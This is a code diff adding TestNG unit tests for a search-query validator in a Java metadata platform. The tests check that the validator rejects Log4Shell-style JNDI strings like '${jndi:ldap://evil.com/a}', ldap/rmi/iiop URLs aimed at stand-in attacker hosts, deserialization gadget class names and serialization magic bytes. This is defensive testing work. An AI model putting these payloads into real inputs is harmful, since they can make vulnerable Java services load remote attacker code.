@@ -4,6 +4,7 @@ import static com.linkedin.datahub.graphql.resolvers.search.SearchUtils.AUTO_COM
 import static com.linkedin.datahub.graphql.resolvers.search.SearchUtils.SEARCHABLE_ENTITY_TYPES;
 import static com.linkedin.metadata.search.elasticsearch.index.entity.v2.V2LegacySettingsBuilder.TEXT_SEARCH_ANALYZER;
 import static com.linkedin.metadata.search.elasticsearch.index.entity.v2.V2LegacySettingsBuilder.URN_SEARCH_ANALYZER;
+import static com.linkedin.metadata.search.elasticsearch.query.request.SearchQueryBuilder.STRUCTURED_QUERY_PREFIX;
 import static io.datahubproject.test.search.SearchTestUtils.TEST_OS_SEARCH_CONFIG;
 import static org.mockito.Mockito.mock;
 import static org.mockito.Mockito.when;
@@ -23,11 +24,13 @@ import com.linkedin.metadata.config.search.CustomConfiguration;
 import com.linkedin.metadata.config.search.ExactMatchConfiguration;
 import com.linkedin.metadata.config.search.PartialConfiguration;
 import com.linkedin.metadata.config.search.SearchConfiguration;
+import com.linkedin.metadata.config.search.SearchValidationConfiguration;
 import com.linkedin.metadata.config.search.WordGramConfiguration;
 import com.linkedin.metadata.config.search.custom.CustomSearchConfiguration;
 import com.linkedin.metadata.config.search.custom.FieldConfiguration;
 import com.linkedin.metadata.config.search.custom.QueryConfiguration;
 import com.linkedin.metadata.config.search.custom.SearchFields;
+import com.linkedin.metadata.entity.validation.ValidationException;
 import com.linkedin.metadata.models.EntitySpec;
 import com.linkedin.metadata.models.SearchableFieldSpec;
 import com.linkedin.metadata.models.annotation.SearchableAnnotation;
@@ -41,6 +44,7 @@ import io.datahubproject.metadata.context.SearchContext;
 import io.datahubproject.test.metadata.context.TestOperationContexts;
 import io.datahubproject.test.search.config.SearchCommonTestConfiguration;
 import java.io.IOException;
+import java.util.Arrays;
 import java.util.Collections;
 import java.util.List;
 import java.util.Map;
@@ -97,9 +101,14 @@ public class SearchQueryBuilderTest extends AbstractTestNGSpringContextTests {
     partialConfiguration.setFactor(0.4f);
     partialConfiguration.setUrnFactor(0.7f);
 
+    SearchValidationConfiguration searchValidationConfiguration =
+        new SearchValidationConfiguration();
+    searchValidationConfiguration.setMaxQueryLength(500);
+
     testQueryConfig.setExactMatch(exactMatchConfiguration);
     testQueryConfig.setWordGram(wordGramConfiguration);
     testQueryConfig.setPartial(partialConfiguration);
+    testQueryConfig.setValidation(searchValidationConfiguration);
   }
 
   public static final SearchQueryBuilder TEST_BUILDER =
@@ -903,5 +912,401 @@ public class SearchQueryBuilderTest extends AbstractTestNGSpringContextTests {
     // Should contain all standard fields, not just the replaced ones
     assertTrue(fields.size() > 2);
     assertTrue(fields.containsKey("customProperties"));
+  }
+
+  @Test
+  public void testValidateSearchQuery_ValidQueries() {
+    // These queries should all pass validation without throwing exceptions
+    List<String> validQueries =
+        Arrays.asList(
+            "test query",
+            "user:john AND department:engineering",
+            "name:dataset*",
+            "field:value OR field2:value2",
+            "exact phrase search",
+            "special-chars_allowed.here@example.com",
+            "unicode支持中文",
+            "numbers 12345",
+            "*",
+            "",
+            "  whitespace  ");
+
+    for (String query : validQueries) {
+      // Should not throw ValidationException
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_ControlCharacters_NullByte() {
+    String maliciousQuery = "test\u0000query";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_ControlCharacters_Bell() {
+    String maliciousQuery = "test\u0007query";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_ControlCharacters_Delete() {
+    String maliciousQuery = "test\u007Fquery";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaClassReference_JavaUtil() {
+    String maliciousQuery = "java.util.HashMap";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaClassReference_JavaLang() {
+    String maliciousQuery = "java.lang.Runtime";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaClassReference_JavaxNaming() {
+    String maliciousQuery = "javax.naming.Context";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaClassReference_SpringFramework() {
+    String maliciousQuery = "org.springframework.context.ApplicationContext";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaClassReference_ComSun() {
+    String maliciousQuery = "com.sun.jndi.rmi.registry.RegistryContext";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaClassReference_CaseInsensitive() {
+    String maliciousQuery = "JAVA.UTIL.HashMap";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JNDIInjection_LDAP() {
+    String maliciousQuery = "ldap://attacker.com/exploit";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JNDIInjection_RMI() {
+    String maliciousQuery = "rmi://evil.com:1099/Exploit";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JNDIInjection_DNS() {
+    String maliciousQuery = "dns://malicious.example.com";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JNDIInjection_IIOP() {
+    String maliciousQuery = "iiop://evil.com:900/obj";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JNDIInjection_JNDI() {
+    String maliciousQuery = "jndi:ldap://attacker.com/a";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JNDIInjection_Oastify() {
+    String maliciousQuery = "test.oastify.com";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JNDIInjection_CaseInsensitive() {
+    String maliciousQuery = "LDAP://ATTACKER.COM/exploit";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_SerializationMagicBytes_Unicode() {
+    String maliciousQuery = "test\u00ac\u00edquery";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_SerializationMagicBytes_Escaped() {
+    String maliciousQuery = "test\\xac\\xedquery";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_ExceedsMaxLength() {
+    // Create a query that exceeds the max length
+    // Assuming default max is 1000 characters based on typical configuration
+    StringBuilder longQuery = new StringBuilder();
+    for (int i = 0; i < 1001; i++) {
+      longQuery.append("a");
+    }
+    TEST_BUILDER.validateSearchQuery(longQuery.toString());
+  }
+
+  @Test
+  public void testValidateSearchQuery_MaxLengthBoundary() {
+    // Create a query at exactly max length - should pass
+    // This test assumes max length of 500
+    StringBuilder query = new StringBuilder();
+    for (int i = 0; i < 500; i++) {
+      query.append("a");
+    }
+    // Should not throw exception
+    TEST_BUILDER.validateSearchQuery(query.toString());
+  }
+
+  @Test
+  public void testValidateSearchQuery_ComplexValidQuery() {
+    // Complex but valid query with various operators and special chars
+    String complexQuery =
+        "name:dataset* AND (tags:pii OR tags:sensitive) "
+            + "NOT deprecated:true platform:\"snowflake\"";
+    TEST_BUILDER.validateSearchQuery(complexQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_Log4ShellPattern() {
+    // Test Log4Shell-style attack pattern
+    String maliciousQuery = "${jndi:ldap://evil.com/a}";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_ObfuscatedJNDI() {
+    // Test obfuscated JNDI pattern
+    String maliciousQuery = "test ${jndi:rmi://attacker.com:1099/obj} query";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test
+  public void testValidateSearchQuery_URLsInData() {
+    // URLs in actual data should be allowed (not JNDI protocols)
+    List<String> validURLQueries =
+        Arrays.asList(
+            "https://example.com",
+            "http://mysite.com/page",
+            "ftp://files.example.com",
+            "mailto:user@example.com");
+
+    for (String query : validURLQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test
+  public void testValidateSearchQuery_JavaKeywordsInData() {
+    // Java keywords in actual data context should be allowed
+    // (the pattern looks for package structures)
+    List<String> validQueries =
+        Arrays.asList("java developer", "util function", "naming convention", "language support");
+
+    for (String query : validQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_CombinedAttack() {
+    // Combination of multiple attack vectors
+    String maliciousQuery = "java.lang.Runtime ${jndi:ldap://evil.com/x} \u0000";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test
+  public void testValidateSearchQuery_EmptyAndWhitespace() {
+    // Edge cases that should be valid
+    TEST_BUILDER.validateSearchQuery("");
+    TEST_BUILDER.validateSearchQuery("   ");
+    TEST_BUILDER.validateSearchQuery("\t");
+    TEST_BUILDER.validateSearchQuery("\n");
+  }
+
+  @Test
+  public void testValidateSearchQuery_SpecialSearchSyntax() {
+    // Valid Elasticsearch/OpenSearch query syntax
+    List<String> validSyntaxQueries =
+        Arrays.asList(
+            "field:value",
+            "field1:value1 AND field2:value2",
+            "field:value*",
+            "field:[1 TO 100]",
+            "(field1:value1 OR field2:value2) AND field3:value3",
+            "field:\"exact phrase\"",
+            "_exists_:field",
+            "field:>100",
+            "field:>=100 AND field:<=200");
+
+    for (String query : validSyntaxQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testBuildQuery_ValidationApplied() {
+    // Test that validation is actually applied during query building
+    TEST_BUILDER.buildQuery(
+        opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "java.lang.Runtime", true);
+  }
+
+  @Test
+  public void testBuildQuery_ValidQuerySucceeds() {
+    // Test that valid queries pass through validation and build successfully
+    QueryBuilder result =
+        TEST_BUILDER.buildQuery(
+            opContext,
+            ImmutableList.of(TestEntitySpecBuilder.getSpec()),
+            "valid search query",
+            true);
+    assertNotNull(result);
+  }
+
+  @Test
+  public void testValidateSearchQuery_EdgeCasePatterns() {
+    // Test patterns that might look suspicious but are valid
+    List<String> edgeCaseQueries =
+        Arrays.asList(
+            "javascript:void(0)", // javascript protocol (not JNDI)
+            "file:///path/to/file", // file protocol (not JNDI)
+            "data:text/plain,hello", // data URI (not JNDI)
+            "java_developer", // underscore separator
+            "util_function", // not a package reference
+            "my-ldap-server", // ldap in name but not protocol
+            "rmi_connection", // rmi in name but not protocol
+            "javax.annotation @Override" // annotation reference in text
+            );
+
+    for (String query : edgeCaseQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaIO() {
+    String maliciousQuery = "java.io.FileInputStream";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_JavaxXML() {
+    String maliciousQuery = "javax.xml.transform.Transformer";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_OrgApache() {
+    String maliciousQuery = "org.apache.commons.collections.Transformer";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test
+  public void testValidateSearchQuery_Unicode() {
+    // Unicode characters should be allowed
+    List<String> unicodeQueries =
+        Arrays.asList("用户名称", "データセット", "사용자", "Пользователь", "مستخدم", "emoji🔍search");
+
+    for (String query : unicodeQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test
+  public void testValidateSearchQuery_StructuredQueryPrefix() {
+    // Test that structured query prefix doesn't interfere
+    String structuredQuery = STRUCTURED_QUERY_PREFIX + "field:value";
+    TEST_BUILDER.validateSearchQuery(structuredQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_StructuredQueryWithAttack() {
+    String maliciousQuery = STRUCTURED_QUERY_PREFIX + "java.lang.Runtime";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testCustomBuilder_ValidationApplied() {
+    // Test that custom builder also applies validation
+    TEST_CUSTOM_BUILDER.buildQuery(
+        opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "ldap://evil.com/a", true);
+  }
+
+  @Test
+  public void testValidateSearchQuery_QuotedStrings() {
+    // Quoted strings should pass validation
+    List<String> quotedQueries =
+        Arrays.asList(
+            "\"exact phrase match\"",
+            "'single quoted'",
+            "field:\"quoted value\"",
+            "name:'John Doe'");
+
+    for (String query : quotedQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_QuotedMalicious() {
+    // Even quoted malicious content should be blocked
+    String maliciousQuery = "\"ldap://evil.com/a\"";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test
+  public void testValidateSearchQuery_Numbers() {
+    // Numeric queries and ranges should be valid
+    List<String> numericQueries =
+        Arrays.asList("12345", "price:>100", "count:[10 TO 100]", "year:2023", "-42", "3.14159");
+
+    for (String query : numericQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test
+  public void testValidateSearchQuery_BooleanOperators() {
+    // Boolean operators should be valid
+    List<String> booleanQueries =
+        Arrays.asList(
+            "term1 AND term2",
+            "term1 OR term2",
+            "NOT term",
+            "term1 AND (term2 OR term3)",
+            "+required -excluded",
+            "term1 && term2",
+            "term1 || term2");
+
+    for (String query : booleanQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
+  }
+
+  @Test(expectedExceptions = ValidationException.class)
+  public void testValidateSearchQuery_CorbaProtocol() {
+    String maliciousQuery = "corba:iiop://evil.com:900/obj";
+    TEST_BUILDER.validateSearchQuery(maliciousQuery);
+  }
+
+  @Test
+  public void testValidateSearchQuery_WildcardsAndRegex() {
+    // Wildcards and basic regex patterns should be valid
+    List<String> wildcardQueries =
+        Arrays.asList("test*", "?est", "te?t*", "field:test*", "field:/regex.*/", "*:*");
+
+    for (String query : wildcardQueries) {
+      TEST_BUILDER.validateSearchQuery(query);
+    }
   }
 }
